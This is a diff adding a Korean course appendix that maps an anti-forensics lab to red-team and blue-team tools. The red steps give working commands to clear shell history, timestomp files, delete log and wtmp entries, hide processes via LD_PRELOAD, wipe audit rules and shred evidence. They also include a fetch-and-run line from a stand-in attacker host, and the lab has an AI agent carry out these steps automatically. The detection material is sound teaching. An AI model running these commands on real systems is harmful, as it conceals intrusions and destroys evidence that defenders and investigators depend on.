@@ -566,3 +566,698 @@ graph LR
 
 **학생 액션**: lab simple ROP.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 11 안티포렌식 / 흔적 은닉·복구 방지)
+
+> 이 부록은 lab `attack-adv-ai/week11.yaml` (15 step + multi_task) 의 모든 명령을 실제로
+> 붙여 넣어 실행할 수 있도록 도구·옵션·예상 출력·해석을 한 곳에 모은 통합 참조다.
+> Red Team 의 흔적 은닉 (T1070/T1027/T1014/T1497) + Blue Team 의 무결성·탐지 (DET 표준) 을
+> 양면으로 다룬다.
+
+### lab step → 도구 매핑 표
+
+| step | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK | Blue 탐지 |
+|------|----------|---------------------|--------|-----------|
+| s1 | 포렌식 아티팩트 인벤토리 | `last`, `wtmp`, `auth.log`, `stat`, `find -mtime` | T1070 (전체) | AIDE / Tripwire baseline |
+| s2 | 셸 히스토리 조작 | `unset HISTFILE`, `history -c`, `ln -s /dev/null ~/.bash_history` | T1070.003 | auditd `execve` 룰 |
+| s3 | 타임스탬프 조작 (timestomp) | `touch -t YYYYMMDDhhmm`, `touch -r ref`, `debugfs` | T1070.006 | `ctime > mtime` 비교, Sleuth Kit `istat` |
+| s4 | 선택적 로그 삭제 | `sed -i /pattern/d`, `awk !/.../`, truncate `>` | T1070.002 | rsyslog 원격, hash chain |
+| s5 | Fileless 실행 | `curl \| bash`, `python3 -c`, `/dev/shm`, `memfd_create` | T1059 / T1620 | EDR memory scan, Sysmon EID 1 |
+| s6 | 안전 삭제 (secure delete) | `shred -vfz -n 3`, `dd if=/dev/urandom`, `wipe`, `srm` | T1070.004 | 디스크 free-space carving (PhotoRec) |
+| s7 | utmp/wtmp 조작 | `utmpdump`, `wtmpclean`, `python utmp` | T1070.002 | auth.log 와 wtmp cross-check |
+| s8 | 프로세스 은닉 | `exec -a [kworker/0:1]`, `LD_PRELOAD libprocesshider.so`, `unshare --mount` | T1014 | rkhunter / chkrootkit, `unhide-linux` |
+| s9 | auditd 회피 | `auditctl -D`, `service auditd stop`, `> audit.log` | T1562.006 | `auditctl -e 2` immutable, audisp-remote |
+| s10 | 디스크 안티포렌식 | `cryptsetup luksFormat`, `tune2fs -O ^has_journal`, `fstrim` | T1486 / T1562 | hardware write blocker + dc3dd 즉시 이미징 |
+| s11 | 네트워크 안티포렌식 | `macchanger -r eth0`, `proxychains4`, `wireguard`, Tor | T1090 / T1573 | NetFlow/JA3, Zeek `ssl.log` |
+| s12 | 메모리 포렌식 회피 | `volatility`/`vol3` linux_pslist + 회피 (memfd 의 `[deleted]`) | T1497 | LiME/AVML 즉시 덤프, Volatility plugin |
+| s13 | 안티포렌식 탐지 (Blue) | AIDE, Tripwire, OSSEC, auditd, Sysmon-Linux | DEFEND | 무결성 baseline + alert |
+| s14 | 윤리·정리 | shred + 가상 머신 스냅샷 / IRB 동의서 | - | RoE 문서 보관 |
+| s15 | Forensic Readiness 체크리스트 | rsyslog TLS, audit immutable, AIDE cron, IR runbook | NIST SP 800-86 | 분기별 mock IR drill |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan (subagent shell·history·timestomp·sed·fileless) | 다중 | 단계별 alert 누적 비교 |
+
+> **읽는 법**: lab 의 `script:` 와 `bastion_prompt:` 가 똑같이 사용하는 명령이며,
+> 학생이 (a) 실제 본문 명령을 직접 실행 (b) bastion_prompt 를 ai 에이전트에 던져 자동 수행
+> (c) 두 경로의 출력 차이를 비교 — 모두 가능하다.
+
+### 학생 환경 준비 (안티포렌식 + 포렌식 도구 풀세트)
+
+```bash
+# === [Red] 안티포렌식 도구 ===
+# shred / wipe / srm — 안전 삭제
+sudo apt install -y secure-delete wipe coreutils
+which shred srm wipe
+
+# utmpdump — wtmp/utmp 텍스트 변환
+sudo apt install -y util-linux acct
+utmpdump --help | head -5
+
+# macchanger — MAC 변조
+sudo apt install -y macchanger
+macchanger --help | head -3
+
+# proxychains4 + tor — 네트워크 회피
+sudo apt install -y proxychains4 tor
+sudo systemctl start tor
+ss -tlnp | grep 9050   # SOCKS
+
+# debugfs — ext4 inode 조작 (timestomp ctime)
+sudo apt install -y e2fsprogs
+which debugfs
+
+# memfd_create 헬퍼 (fileless)
+cat > /tmp/memfd_demo.c << 'C'
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+int main(){int fd=memfd_create("ghost",0); dprintf(fd,"#!/bin/sh\nid\n"); fchmod(fd,0755);
+char p[64]; sprintf(p,"/proc/self/fd/%d",fd); execl(p,"ghost",NULL);}
+C
+gcc /tmp/memfd_demo.c -o /tmp/memfd_demo
+
+# LOLBins (이미 시스템 도구) — curl wget python3 perl awk
+which curl wget python3 perl awk
+
+# === [Red] 프로세스 은닉 도구 ===
+# libprocesshider — LD_PRELOAD readdir 후킹 PoC
+git clone https://github.com/gianlucaborello/libprocesshider /tmp/lph
+cd /tmp/lph && make
+# 사용: 차후 `evil_script` 라는 이름의 프로세스를 ps 출력에서 숨김
+
+# unhide / unhide-tcp — 은닉된 프로세스 탐지 (Blue 측)
+sudo apt install -y unhide
+
+# === [Blue] 포렌식 도구 ===
+# AIDE — Advanced Intrusion Detection Environment (파일 무결성)
+sudo apt install -y aide
+sudo aideinit         # baseline 생성 (수십초)
+sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+# Tripwire — 또 다른 FIM (선택)
+sudo apt install -y tripwire
+
+# OSSEC HIDS — 호스트 이상 탐지 (선택, 무거움)
+# https://www.ossec.net 참조
+
+# Volatility 3 — 메모리 포렌식
+sudo apt install -y python3-pip
+pip3 install volatility3
+
+# LiME — Linux 메모리 덤프 LKM
+sudo apt install -y linux-headers-$(uname -r) build-essential
+git clone https://github.com/504ensicsLabs/LiME /tmp/lime
+cd /tmp/lime/src && make
+# 산출: lime-<kernel>.ko
+
+# Sleuth Kit — 디스크 분석 (mtime/atime/ctime)
+sudo apt install -y sleuthkit
+which istat ils fls mactime
+
+# PhotoRec / TestDisk — 카빙 (slack space 복구)
+sudo apt install -y testdisk
+
+# auditd — 시스템콜 감사
+sudo apt install -y auditd audispd-plugins
+sudo systemctl enable --now auditd
+sudo auditctl -l       # 현재 룰 (없으면 비어있음)
+
+# Sysmon for Linux (선택, MS) — 프로세스/파일/네트워크 이벤트 통합
+# https://github.com/Sysinternals/SysmonForLinux
+
+# rsyslog TLS — 원격 로그 (Forensic Readiness)
+sudo apt install -y rsyslog-gnutls
+```
+
+각 도구가 **lab 의 어느 step 에서** 활성화되는지 명시적으로 매핑된다. s1 의 `stat`/`last` 만 사전 설치 없이 동작하고, s6 의 `wipe` / s11 의 `macchanger`/`tor` / s12 의 `volatility3` 는 위 설치가 선행되어야 한다.
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: shred — 안전 삭제 (Step 6)
+
+```bash
+# 기본 — 3-pass 덮어쓰기 + zero fill (DoD 5220.22-M)
+echo 'sensitive data — credit card 4242-4242-4242-4242' > /tmp/secret.txt
+shred -vfz -n 3 /tmp/secret.txt
+# -v verbose / -f force / -z 마지막 0 fill / -n 3 3회 random pass
+
+# 출력 예
+# shred: /tmp/secret.txt: pass 1/4 (random)...
+# shred: /tmp/secret.txt: pass 2/4 (random)...
+# shred: /tmp/secret.txt: pass 3/4 (random)...
+# shred: /tmp/secret.txt: pass 4/4 (000000)...
+
+# 실제 inode 가 같은지 확인 (truncate vs shred)
+ls -li /tmp/secret.txt 2>/dev/null   # shred 만으로는 파일 자체는 남음
+shred -u /tmp/secret.txt              # -u 추가시 unlink 까지
+
+# dd 로 직접 — random 1MB 단위
+dd if=/dev/urandom of=/tmp/big bs=1M count=10
+dd if=/dev/urandom of=/tmp/big bs=1M count=10 conv=notrunc   # 같은 파일에 덮어쓰기
+sync && rm /tmp/big
+
+# wipe — Gutmann 35-pass (HDD 깊이 삭제)
+wipe -f -r /tmp/secret.txt
+# -f 확인 없이 / -r 디렉터리 재귀
+
+# SSD 한계 시연 (TRIM 없으면 wear leveling 으로 셀이 다른 곳에 남음)
+sudo fstrim -v /                    # TRIM 직접 실행
+# 출력: /: 12.4 GiB (13312000000 bytes) trimmed
+```
+
+탐지 (Blue): `dd_rescue` / PhotoRec 으로 free-space 카빙 → SSD + TRIM 직후 = 0 회복, HDD + shred 1-pass = 자기 잔류 (magnetic remanence) 로 일부 회복 가능 (NSA Class III).
+
+#### 도구 2: touch / debugfs — 타임스탬프 조작 (Step 3)
+
+```bash
+# 기본 — atime / mtime 만 변경 가능
+echo test > /tmp/tt
+stat /tmp/tt | grep -E "(Access|Modify|Change|Birth)"
+# Access: 2026-05-02 17:00:00.000
+# Modify: 2026-05-02 17:00:00.000
+# Change: 2026-05-02 17:00:00.000
+# Birth : 2026-05-02 17:00:00.000
+
+touch -t 202301010000 /tmp/tt
+stat /tmp/tt | grep -E "(Access|Modify|Change|Birth)"
+# Access: 2023-01-01 00:00:00.000
+# Modify: 2023-01-01 00:00:00.000
+# Change: 2026-05-02 17:00:05.000   ← inode 변경 시각 (조작 흔적!)
+# Birth : 2026-05-02 17:00:00.000
+
+# 참조 파일 기준 — 다른 파일과 동일 시각
+touch -r /etc/passwd /tmp/malware
+stat /tmp/malware | grep Modify
+
+# 고급: ctime 도 조작 (debugfs 필요, root, 마운트된 파일시스템에서 위험)
+sudo debugfs -w /dev/sda1 << 'EOF'
+cd /tmp
+mi tt
+EOF
+# inode 시각을 직접 16진 입력 → 거의 사용 안 함, ext4 저널 흔적 남음
+
+# Birth time (crtime) — 가장 변조 어려움 (ext4 inode 추가 필드)
+sudo debugfs -R 'stat <inode_num>' /dev/sda1
+
+# Sleuth Kit 으로 mactime 분석 (Blue)
+sudo fls -m / -r /dev/sda1 > /tmp/body.txt
+mactime -b /tmp/body.txt -d 2026-05-02 | head -20
+# Date,Size,Type,Mode,UID,GID,Meta,File
+```
+
+핵심 원리: `ctime > mtime` 인 파일은 timestomp 의 가장 강한 시그니처. AIDE/Tripwire baseline 은 `Birth time` 까지 hash 에 포함하므로 ext4 의 inode level 변조 (debugfs) 가 아닌 한 탐지된다.
+
+#### 도구 3: utmpdump — 로그인 기록 조작 (Step 7)
+
+```bash
+# 현재 wtmp 텍스트 변환
+sudo utmpdump /var/log/wtmp | head -10
+# [2] [00000] [~~  ] [shutdown] [~           ] [3.13.0-43-generic ] [0.0.0.0        ] [Tue Mar 25 10:00:00 2026 KST]
+# [7] [05428] [pts/0] [ccc     ] [pts/0       ] [10.20.30.201      ] [10.20.30.201    ] [Tue Mar 25 10:05:00 2026 KST]
+
+# 텍스트 추출 → 편집 → 바이너리 재변환
+sudo utmpdump /var/log/wtmp > /tmp/wtmp.txt
+sed -i '/10.20.30.201/d' /tmp/wtmp.txt        # 공격자 IP 제거
+sudo utmpdump -r /tmp/wtmp.txt > /var/log/wtmp_new
+sudo cp /var/log/wtmp_new /var/log/wtmp        # 덮어쓰기 (위험)
+
+# 확인
+last -10                                       # IP 사라짐
+last -f /var/log/wtmp_new -10
+
+# wtmp + auth.log 교차 검증 (Blue)
+sudo last | awk '{print $1, $5}' | sort -u > /tmp/login_users.txt
+sudo grep "Accepted" /var/log/auth.log | awk '{print $9, $11}' | sort -u > /tmp/auth_users.txt
+diff /tmp/login_users.txt /tmp/auth_users.txt
+# 한쪽에만 있는 행 = 조작 시그니처
+
+# Python utmp 직접 조작 (Cross-distro)
+python3 << 'PY'
+import struct
+UTMP_FORMAT = '<hi32s4s32s256shhiii4i20s'
+with open('/var/log/wtmp','rb') as f:
+    while chunk := f.read(struct.calcsize(UTMP_FORMAT)):
+        rec = struct.unpack(UTMP_FORMAT, chunk)
+        print(rec[5].rstrip(b'\x00').decode('latin1'))   # 호스트
+PY
+```
+
+원격 syslog (rsyslog TLS) 또는 SIEM 으로 wtmp 변경 이벤트가 즉시 송출되면 로컬 조작이 무의미.
+
+#### 도구 4: AIDE / Tripwire — 파일 무결성 (Step 13 Blue)
+
+```bash
+# AIDE 초기화 — sha256 + permissions + atime/mtime/ctime/Birth
+sudo cat /etc/aide/aide.conf | head -30
+# Database location:
+# database=file:/var/lib/aide/aide.db
+# database_out=file:/var/lib/aide/aide.db.new
+
+sudo aideinit                     # 약 30~120초 (디스크 크기에 비례)
+ls -lh /var/lib/aide/aide.db
+
+# 변경 감지 (수동)
+sudo touch -t 202001010000 /etc/passwd     # 시뮬레이션
+sudo aide --check
+# 출력 예:
+# AIDE found differences between database and filesystem!!
+# changed entries:
+#   f >.... mc.... : /etc/passwd
+# Detailed information about changes:
+# File: /etc/passwd
+#   Mtime    : 2026-05-02 17:00:00              | 2020-01-01 00:00:00
+#   Ctime    : 2026-05-02 17:00:00              | 2026-05-02 17:00:05
+
+# 자동 cron — 하루 1회 baseline 갱신 + 체크 메일
+sudo tee /etc/cron.daily/aide-check > /dev/null << 'CRON'
+#!/bin/bash
+/usr/sbin/aide --check 2>&1 | mail -s "AIDE report" security@corp.example
+CRON
+sudo chmod +x /etc/cron.daily/aide-check
+
+# Tripwire (대안)
+sudo twadmin --create-polfile /etc/tripwire/twpol.txt
+sudo tripwire --init
+sudo tripwire --check
+```
+
+AIDE/Tripwire 의 한계: baseline 자체가 변조되면 의미 없음 → `/var/lib/aide/aide.db` 를 read-only 매체 (USB) 또는 원격 read-only NFS 로 보호.
+
+#### 도구 5: Volatility 3 — 메모리 포렌식 (Step 12 Blue)
+
+```bash
+# 메모리 덤프 (LiME LKM)
+cd /tmp/lime/src && make
+sudo insmod lime-$(uname -r).ko "path=/tmp/mem.lime format=lime"
+ls -lh /tmp/mem.lime           # 16GB 시스템이면 ~16GB
+
+# Volatility 3 분석
+vol3 -f /tmp/mem.lime linux.pslist
+# OFFSET (V)         PID    PPID    COMM
+# 0xffff9b2c12345000 1234   1       systemd
+# 0xffff9b2c45678000 5678   1234    bash
+# 0xffff9b2c89abc000 9876   5678    [kworker/0:1]   ← 의심 (kthread 가 user proc 의 자식?)
+
+vol3 -f /tmp/mem.lime linux.bash      # bash 명령 history (메모리에서 직접)
+vol3 -f /tmp/mem.lime linux.lsmod    # 로드된 커널 모듈
+vol3 -f /tmp/mem.lime linux.check_modules    # /proc 와 /sys 일치성
+
+# Fileless 탐지 — memfd / [deleted] 매핑
+vol3 -f /tmp/mem.lime linux.proc.Maps | grep -E "(deleted|memfd)"
+# 5678   /memfd:ghost (deleted)   ← memfd_create 사용 흔적
+
+# AVML — Microsoft 의 memory acquisition (LiME 대안)
+git clone https://github.com/microsoft/avml /tmp/avml
+cd /tmp/avml && cargo build --release
+sudo ./target/release/avml /tmp/mem.avml
+```
+
+회피 (Red): LiME 자체가 LKM 으로 sysmon 의 `module_load` 이벤트를 발생 → Red 가 LKM 로딩을 차단하면 AVML 도 fail. **회피 한계**: cold boot attack (전원 차단 후 RAM 직접 읽기) 은 회피 불가.
+
+#### 도구 6: auditd — 시스템 감사 (Step 9)
+
+```bash
+# 룰 작성 — 모든 execve + 파일 변경 감사
+sudo tee /etc/audit/rules.d/audit.rules > /dev/null << 'RULES'
+-a always,exit -F arch=b64 -S execve -k exec
+-w /var/log -p wa -k log_tamper
+-w /etc/passwd -p wa -k passwd_change
+-w /var/log/wtmp -p wa -k login_record
+RULES
+
+sudo augenrules --load
+sudo auditctl -l
+# -a always,exit -F arch=b64 -S execve -F key=exec
+# -w /var/log -p wa -k log_tamper
+# -w /etc/passwd -p wa -k passwd_change
+# -w /var/log/wtmp -p wa -k login_record
+
+# 즉시 감사 로그 확인
+sudo tail -3 /var/log/audit/audit.log
+# type=SYSCALL msg=audit(1746176400.000:1234): arch=c000003e syscall=59 success=yes
+# type=EXECVE msg=audit(1746176400.000:1234): argc=2 a0="ls" a1="-la"
+
+# 검색 — ausearch
+sudo ausearch -k log_tamper --start today
+sudo ausearch -k exec -ui 1000 --start recent | aureport --summary
+
+# Immutable (재부팅 전까지 변경 불가)
+sudo auditctl -e 2          # 0=off 1=on 2=immutable
+sudo auditctl -D            # 시도 → "Operation not permitted"
+
+# 회피 (Red) — auditctl -e 2 가 안 걸려있을 때만
+sudo auditctl -D            # 모든 룰 삭제
+sudo systemctl stop auditd  # 서비스 중지
+sudo > /var/log/audit/audit.log    # truncate
+
+# 원격 audit (audisp-remote) — 로컬 조작 무력화
+sudo apt install -y audispd-plugins
+sudo tee /etc/audit/plugins.d/au-remote.conf > /dev/null << 'CFG'
+active = yes
+direction = out
+path = /sbin/audisp-remote
+type = always
+format = string
+CFG
+sudo tee /etc/audisp/audisp-remote.conf > /dev/null << 'CFG'
+remote_server = siem.corp.example
+port = 60
+transport = tcp
+CFG
+```
+
+Defender 우선순위: `auditctl -e 2` + `audisp-remote` 두 가지가 동시에 적용되어야 안전.
+
+#### 도구 7: macchanger / proxychains4 — 네트워크 안티포렌식 (Step 11)
+
+```bash
+# 현재 MAC
+ip link show eth0 | grep ether
+# link/ether 00:0c:29:ab:cd:ef brd ff:ff:ff:ff:ff:ff
+
+# 임의 MAC
+sudo ip link set eth0 down
+sudo macchanger -r eth0
+# Current MAC:   00:0c:29:ab:cd:ef (VMware, Inc.)
+# Permanent MAC: 00:0c:29:ab:cd:ef (VMware, Inc.)
+# New MAC:       8e:d7:42:1f:9b:53 (unknown)
+sudo ip link set eth0 up
+
+# 특정 vendor (Apple) 으로 위장 — 회사 BYOD 인 척
+sudo macchanger -A eth0
+# 또는 직접: sudo ip link set eth0 address aa:bb:cc:dd:ee:ff
+
+# 영구 — netplan
+sudo tee /etc/netplan/99-mac.yaml > /dev/null << 'YAML'
+network:
+  version: 2
+  ethernets:
+    eth0:
+      macaddress: "8e:d7:42:1f:9b:53"
+YAML
+sudo netplan apply
+
+# proxychains4 + Tor
+sudo systemctl start tor
+ss -tlnp | grep 9050         # 127.0.0.1:9050 SOCKS
+
+cat /etc/proxychains4.conf | grep -E "^socks"
+# socks5 127.0.0.1 9050
+
+proxychains4 curl -s https://check.torproject.org/api/ip
+# {"IsTor":true,"IP":"185.220.101.34"}
+
+# nmap 통한 익명 스캔 (느림, ICMP 안 됨)
+proxychains4 nmap -sT -Pn -p 80,443 example.com
+
+# 다단계 — 복수 SOCKS / HTTP
+sudo tee -a /etc/proxychains4.conf << 'CFG'
+[ProxyList]
+socks5 127.0.0.1 9050
+http   1.2.3.4 8080
+socks4 5.6.7.8 1080
+CFG
+```
+
+탐지 (Blue) 한계: TLS 내용은 가려도 NetFlow 의 `(srcIP, dstIP, port, bytes, time)` 메타데이터는 그대로 → JA3/JA3S TLS fingerprint 로 Tor 사용자 식별 가능.
+
+#### 도구 8: libprocesshider — LD_PRELOAD 프로세스 은닉 (Step 8)
+
+```bash
+cd /tmp/lph
+ls
+# evil_script  Makefile  processhider.c  README.md
+
+# evil_script 라는 이름의 프로세스만 숨김
+cat processhider.c | head -30
+# static const char* process_to_filter = "evil_script";
+
+# 시스템 로딩
+sudo cp libprocesshider.so /usr/local/lib/
+sudo bash -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
+sudo ldconfig
+
+# 위장 프로세스 시작
+cp /bin/sleep /tmp/evil_script
+/tmp/evil_script 3600 &
+ps aux | grep evil_script        # ★ 출력에 안 보임
+ls /proc | grep -v "[a-z]" | head    # PID 디렉터리는 존재
+
+# 탐지 (Blue) — unhide
+sudo unhide brute
+# Found HIDDEN PID: 12345
+sudo unhide proc
+sudo unhide-tcp                   # 은닉된 socket
+sudo unhide-linux sys             # syscall 비교 quick
+
+# /proc 직접 비교 (가장 신뢰)
+ls /proc | grep -E '^[0-9]+$' | while read p; do
+  ps -p $p > /dev/null 2>&1 || echo "HIDDEN PID $p ($(cat /proc/$p/comm 2>/dev/null))"
+done
+
+# 정리
+sudo rm /etc/ld.so.preload
+sudo ldconfig
+kill %1
+```
+
+이 PoC 는 user-space LD_PRELOAD 라 root unhide 로 즉시 탐지된다. **kernel-level rootkit** (Diamorphine 등) 은 unhide 도 우회 → 메모리 포렌식 (Volatility `linux.check_modules`) 만 신뢰 가능.
+
+#### 도구 9: rsyslog TLS — Forensic Readiness 의 핵심 (Step 15)
+
+```bash
+# 송신측 (web/secu/attacker)
+sudo apt install -y rsyslog-gnutls
+sudo tee /etc/rsyslog.d/01-remote.conf > /dev/null << 'RSY'
+$DefaultNetstreamDriver gtls
+$DefaultNetstreamDriverCAFile /etc/ssl/certs/siem-ca.pem
+$DefaultNetstreamDriverCertFile /etc/ssl/certs/web.pem
+$DefaultNetstreamDriverKeyFile  /etc/ssl/private/web.key
+
+*.* action(type="omfwd"
+  Target="siem.corp.example" Port="6514" Protocol="tcp"
+  StreamDriver="gtls" StreamDriverMode="1" StreamDriverAuthMode="x509/name")
+RSY
+sudo systemctl restart rsyslog
+
+# 수신측 (siem)
+sudo tee /etc/rsyslog.d/01-recv.conf > /dev/null << 'RCV'
+$ModLoad imtcp
+$InputTCPServerStreamDriverMode 1
+$InputTCPServerStreamDriverAuthMode x509/name
+$InputTCPServerStreamDriverPermittedPeer *.corp.example
+$InputTCPServerRun 6514
+
+template(name="RemoteFiles" type="list") {
+  constant(value="/var/log/remote/")
+  property(name="hostname")
+  constant(value=".log")
+}
+*.* ?RemoteFiles
+RCV
+sudo systemctl restart rsyslog
+
+# 검증
+ls -la /var/log/remote/
+# -rw-r----- 1 syslog adm 124K May  2 17:30 web.log
+# -rw-r----- 1 syslog adm  87K May  2 17:30 attacker.log
+```
+
+원격 송신 후 로컬 `> /var/log/syslog` truncate 는 무의미 — siem 은 이미 받았다. 학생이 s4 의 `sed -i` 시뮬레이션 후 siem 의 `/var/log/remote/web.log` 에 원본이 살아있는지 확인하면 학습 효과 즉시 검증.
+
+### 점검 / 공격 / 방어 흐름 (15 step + multi_task 통합)
+
+#### Phase A — 사전 인벤토리 (정찰, s1)
+
+```bash
+# 시스템 baseline 측정
+echo "=== Baseline Forensic Inventory ==="
+echo "[Logs]"
+ls -la /var/log/{auth,sys,wtmp,btmp,lastlog,audit/audit}.log 2>/dev/null
+wc -l ~/.bash_history /var/log/auth.log /var/log/syslog 2>/dev/null
+echo "[Auditd]"
+sudo auditctl -l 2>/dev/null | wc -l
+echo "[FIM]"
+[ -f /var/lib/aide/aide.db ] && stat /var/lib/aide/aide.db | grep Modify
+echo "[Remote logging]"
+grep -E "(omfwd|@@)" /etc/rsyslog.* 2>/dev/null | head -3
+```
+
+이 출력을 commit 해두면 phase B 후 **달라진 것** 을 즉시 비교 가능 → 안티포렌식 효과 정량화.
+
+#### Phase B — 공격자 흔적 은닉 시도 (s2 ~ s11)
+
+```bash
+# 1. 셸 히스토리 차단
+unset HISTFILE; export HISTSIZE=0; set +o history
+ln -sf /dev/null ~/.bash_history
+
+# 2. timestomp — /tmp 의 악성 페이로드를 평범한 시각으로
+echo "evil" > /tmp/payload.sh
+touch -t 201501010800 /tmp/payload.sh
+touch -r /etc/hostname /tmp/payload.sh    # 시스템 파일과 동일 시각
+
+# 3. 로그 선택 삭제 — 자기 IP 만
+sudo cp /var/log/auth.log /tmp/auth.bak
+sudo sed -i '/10.20.30.201/d' /var/log/auth.log
+diff /tmp/auth.bak /var/log/auth.log | wc -l
+
+# 4. fileless 페이로드 — 메모리에서만 실행
+curl -s http://attacker.local/p.sh | bash
+# 또는 memfd_create (디스크 무흔적 + 자식 프로세스)
+/tmp/memfd_demo
+
+# 5. utmp/wtmp — 로그인 기록 제거
+sudo utmpdump /var/log/wtmp > /tmp/wtmp.txt
+sed -i '/10.20.30.201/d' /tmp/wtmp.txt
+sudo utmpdump -r /tmp/wtmp.txt > /var/log/wtmp
+
+# 6. 프로세스 은닉 — LD_PRELOAD
+sudo cp /tmp/lph/libprocesshider.so /usr/local/lib/
+sudo bash -c 'echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload'
+
+# 7. 안전 삭제 — 도구·증거 모두 shred
+shred -vfz -n 3 -u /tmp/payload.sh /tmp/wtmp.txt
+
+# 8. auditd 회피 (immutable 안 걸려 있을 때)
+sudo auditctl -D
+
+# 9. 디스크 — 저널 무력화 (위험, 데모만)
+sudo tune2fs -O ^has_journal /dev/sdb1     # 별도 디스크에서만
+
+# 10. 네트워크 — MAC + Tor
+sudo macchanger -r eth0
+proxychains4 curl -s http://victim.example/admin
+```
+
+#### Phase C — 방어자 탐지 (s12 ~ s15, Blue)
+
+```bash
+# 1. 무결성 비교 — AIDE
+sudo aide --check 2>&1 | tee /tmp/aide-result.txt | head -20
+grep -c "^File:" /tmp/aide-result.txt    # 변경된 파일 수
+
+# 2. ctime > mtime 시그니처
+find / -type f -newer /tmp/aide-result.txt 2>/dev/null | head -10
+sudo find /etc /var -mtime -1 -newermt '2 hours ago' 2>/dev/null | head -10
+
+# 3. 원격 syslog 비교 — 로컬과 SIEM 의 라인 수
+local_lines=$(wc -l < /var/log/auth.log)
+remote_lines=$(ssh siem "wc -l < /var/log/remote/$(hostname).log" 2>/dev/null | awk '{print $1}')
+echo "Local: $local_lines  Remote: $remote_lines  Diff: $((remote_lines - local_lines))"
+
+# 4. 메모리 분석 — fileless / process hide 동시 검출
+sudo insmod /tmp/lime/src/lime-$(uname -r).ko "path=/tmp/mem.lime format=lime"
+vol3 -f /tmp/mem.lime linux.pslist > /tmp/vol-pslist.txt
+ps aux > /tmp/ps-aux.txt
+diff <(awk '{print $2}' /tmp/vol-pslist.txt | sort) <(awk '{print $2}' /tmp/ps-aux.txt | sort)
+# 좌측에만 있는 PID = LD_PRELOAD 로 숨겨진 프로세스
+
+# 5. unhide / chkrootkit
+sudo unhide brute
+sudo chkrootkit | grep -v "not infected"
+
+# 6. wtmp ↔ auth.log 교차 검증
+sudo last | awk '{print $5}' | sort -u > /tmp/wtmp_ips.txt
+sudo grep "Accepted" /var/log/auth.log | awk '{print $11}' | sort -u > /tmp/auth_ips.txt
+comm -23 /tmp/auth_ips.txt /tmp/wtmp_ips.txt  # auth 에만 있는 IP = wtmp 조작 흔적
+
+# 7. NetFlow 메타데이터 — 암호화 회피 불가
+sudo nfcapd -w -p 2055 -l /tmp/nfcap &
+nfdump -R /tmp/nfcap -A srcip,dstip,proto,dstport -O bytes -c 20
+# Tor 사용자도 destination IP 와 timing pattern 으로 식별
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 에이전트가 한 번에 계획·실행:
+
+1. **plan**: "5 작업 순서 결정 — history 차단 먼저 (이후 명령 isolation), 그 다음 timestomp / log sed / fileless / final cleanup"
+2. **execute**: 각 작업당 1 SubAgent shell 호출. exit_code 0 + verify regex 충족 확인.
+3. **synthesize**: ATT&CK ID 5개 (T1070.003 / T1070.006 / T1070.002 / T1059 / T1070.004) + 각 작업의 detection-side 룰 명시.
+
+학생은 multi-task 의 `bastion_prompt` 를 그대로 던지고 — 결과 5개의 `success_criteria` 가 모두 충족되었는지 한 번에 검증.
+
+### 도구 비교표 — 안티포렌식 vs 포렌식
+
+| 카테고리 | Red 도구 | Red 기법 한계 | Blue 도구 | Blue 우위 조건 |
+|---------|---------|---------------|-----------|----------------|
+| **로그 삭제** | sed -i, truncate, shred | 원격 syslog 송신 후엔 무의미 | rsyslog TLS, Splunk UF, fluentd | 즉시 송출 + read-only 매체 |
+| **timestomp** | touch -t/-r | ctime, Birth time 추적 가능 | Sleuth Kit istat, AIDE | Birth time 까지 hash |
+| **utmp/wtmp** | utmpdump -r | auth.log 와 cross-check | wtmp + auth.log diff | 다중 로그 source |
+| **fileless** | curl\|bash, memfd | EDR 메모리 스캔, Sysmon EID 1 | Volatility, AVML | 즉시 메모리 덤프 |
+| **secure delete** | shred, wipe, srm | SSD wear leveling, TRIM 전 | PhotoRec, dd_rescue | 디스크 즉시 이미징 (write blocker) |
+| **process hide** | LD_PRELOAD, exec -a | unhide, /proc vs ps | unhide, Volatility check_modules | 메모리 포렌식 |
+| **auditd 회피** | -D, stop, truncate | -e 2 immutable, audisp-remote | auditd immutable + 원격 | -e 2 사전 적용 |
+| **disk anti-fx** | LUKS, TRIM, ^has_journal | cold boot, key in memory | hardware write blocker, dc3dd | 전원 유지 + 즉시 이미징 |
+| **network anti-fx** | macchanger, Tor, VPN | NetFlow 메타데이터 회피 불가 | Zeek, JA3, NetFlow | 메타데이터 분석 |
+| **memory hide** | rootkit + LD_PRELOAD | Volatility check_modules | LiME + Volatility | 즉시 dump |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "공격 후 5분 내 흔적 제거" | sed -i + shred + history -c + ln -s /dev/null | 빠르지만 syslog 원격이면 실패 |
+| "장기 잠복 (APT)" | LOLBins + memfd + LD_PRELOAD + macchanger | 디스크 무흔적 유지 |
+| "감사 비활성 (insider)" | auditctl -D + service auditd stop | -e 2 가 없을 때만 가능 |
+| "포렌식 수사 대비 (defender)" | AIDE + auditd -e 2 + rsyslog TLS + LiME 사전 ready | 4 개를 동시 운영해야 안전 |
+| "사고 발생 즉시 대응" | LiME → Volatility → dc3dd 디스크 이미지 → Sleuth Kit | 전원 유지 + 휘발성 우선 (RFC 3227) |
+| "교육·연구 (윤리적)" | VM 스냅샷 + IRB 동의서 + RoE 명시 | 격리 환경 + 사후 복원 |
+
+### Forensic Readiness 체크리스트 (s15 산출물)
+
+학생이 s15 에서 `/tmp/forensic_readiness.txt` 에 작성하는 30+ 항목을 도구 매핑과 함께:
+
+| 카테고리 | 항목 | 도구 / 명령 |
+|---------|------|------------|
+| Logs | 원격 syslog (TLS) | rsyslog-gnutls, fluentd |
+| Logs | audit immutable | `auditctl -e 2` |
+| Logs | 90일 retention | logrotate, S3 Glacier |
+| FIM | baseline daily | AIDE cron, Tripwire |
+| FIM | 외부 매체 보관 | USB read-only mount |
